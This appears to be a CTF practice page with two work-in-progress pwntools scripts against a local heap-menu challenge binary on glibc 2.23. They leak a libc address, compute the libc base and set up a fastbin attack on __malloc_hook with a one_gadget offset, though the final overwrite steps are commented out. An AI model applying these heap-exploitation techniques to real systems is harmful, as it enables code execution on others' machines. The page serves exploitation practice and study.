```python
from pwn import *

libc = ELF("./libc.2.23.so", checksec=False)

context.binary = exe = ELF("./pwn5_null_patched", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		br createHeap
		br *createHeap+159

		br deleteHeap
		br *deleteHeap+123

		br showHeap
		br showHeap+133

		br editHeap
		br *editHeap+199
		br *editHeap+403

		# heap check:
		# heap [-v]
		# vis
		# vmmap
		# x/4gx 0x006020e0
		''')

p = process(exe.path)
# GDB()

def createHeap(idx, size, data):
	p.sendlineafter(b">", b'1')
	p.sendlineafter(b"Index:", idx)
	p.sendlineafter(b"size:", size)
	p.sendafter(b"data:", data)

def showHeap(idx):
	p.sendlineafter(b">", b'2')
	p.sendlineafter(b"Index:", idx)	

def editHeap(idx, size, opt, data):
	p.sendlineafter(b">", b'3')
	p.sendlineafter(b"index:", idx)
	p.sendlineafter(b"newsize:", size)
	p.sendlineafter(b"?", opt)
	if opt == b'y': 
		p.sendafter(b"data:", data)

def deleteHeap(idx):
	p.sendlineafter(b">", b'4')
	p.sendlineafter(b"index:", idx)	

createHeap(b'0', b'16', b'A'*16)
createHeap(b'1', b'1040', b'B'*512)
createHeap(b'2', b'16', b'C'*16)
GDB()
createHeap(b'3', b'96', b'D'*16)
createHeap(b'4', b'16', b'E'*16)

deleteHeap(b'1')

editHeap(b'0', b'32', b'n', b'')

showHeap(b'0')

leak_libc = p.recvuntil(b'=')
leak_libc = p.recvline().strip()
leak_libc = u64(leak_libc.ljust(8, b"\x00"))
print(f"leak_libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x39bf68

print(f"libc_base: {hex(libc.address)}")

realloc = libc.sym['realloc']
fake_chunk = libc.sym['__malloc_hook'] - 0x23
one_gadget = libc.address + 0xd5bf7

editHeap(b'4', b'96', b'n', b'')
# editHeap(b'3', b'95', b'y', p64(fake_chunk))
# deleteHeap(b'3')

print(f"fake_chunk: {hex(fake_chunk)}")
print(f"realloc: {hex(realloc)}")
print(f"one_gadget: {hex(one_gadget)}")

# createHeap(b'5', b'96', b'F'*16)

p.interactive()
```
````python
from pwn import *

libc = ELF("./libc.2.23.so", checksec=False)

context.binary = exe = ELF("./pwn5_null_patched", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		br createHeap
		br *createHeap+159

		br deleteHeap
		br *deleteHeap+123

		br showHeap
		br showHeap+133

		br editHeap
		br *editHeap+199
		br *editHeap+403

		# heap check:
		# heap [-v]
		# vis
		# vmmap
		# x/4gx 0x006020e0
		''')

p = process(exe.path)
GDB()

def createHeap(idx, size, data):
	p.sendlineafter(b">", b'1')
	p.sendlineafter(b"Index:", idx)
	p.sendlineafter(b"size:", size)
	p.sendafter(b"data:", data)

def showHeap(idx):
	p.sendlineafter(b">", b'2')
	p.sendlineafter(b"Index:", idx)	

def editHeap(idx, size, opt, data):
	p.sendlineafter(b">", b'3')
	p.sendlineafter(b"index:", idx)
	p.sendlineafter(b"newsize:", size)
	p.sendlineafter(b"?", opt)
	if opt == b'y': 
		p.sendafter(b"data:", data)

def deleteHeap(idx):
	p.sendlineafter(b">", b'4')
	p.sendlineafter(b"index:", idx)	

# # CREATING CHUNKS #####################
# createHeap(b'0', b'16', b'A'*16)
# createHeap(b'1', b'1040', b'B'*512)
# createHeap(b'2', b'96', b'C'*16)
# createHeap(b'3', b'16', b'D'*16) # chunk avoid merging

# # LEAK LIBC ###########################
# deleteHeap(b'1')
# editHeap(b'0', b'32', b'n', b'')#chunk
# showHeap(b'0')

# leak_libc = p.recvuntil(b'=')
# leak_libc = p.recvline().strip()
# leak_libc = u64(leak_libc.ljust(8, b"\x00"))
# libc.address = leak_libc - 0x39bf68
# print(f"leak_libc: {hex(leak_libc)}")
# print(f"libc_base: {hex(libc.address)}")
# #######################################

# realloc = libc.sym['realloc']
# fake_chunk = libc.sym['__malloc_hook'] - 0x23
# one_gadget = libc.address + 0xd5bf7
# print(f"fake_chunk: {hex(fake_chunk)}")
# print(f"realloc: {hex(realloc)}")
# print(f"one_gadget: {hex(one_gadget)}")

# # EXPLOIT: HEAP OVERFLOW ##############
# deleteHeap(b'2')
# createHeap(b'1', b'1000', b'IM HERE')


createHeap(b'0', b'24', b'A'*24)



p.interactive()
````
<img width="659" height="290" alt="image" src="https://github.com/user-attachments/assets/0606f4f0-7dcd-4e6e-aba4-4e0cab52f700" />


___
docs:

https://devel0pment.de/?p=688
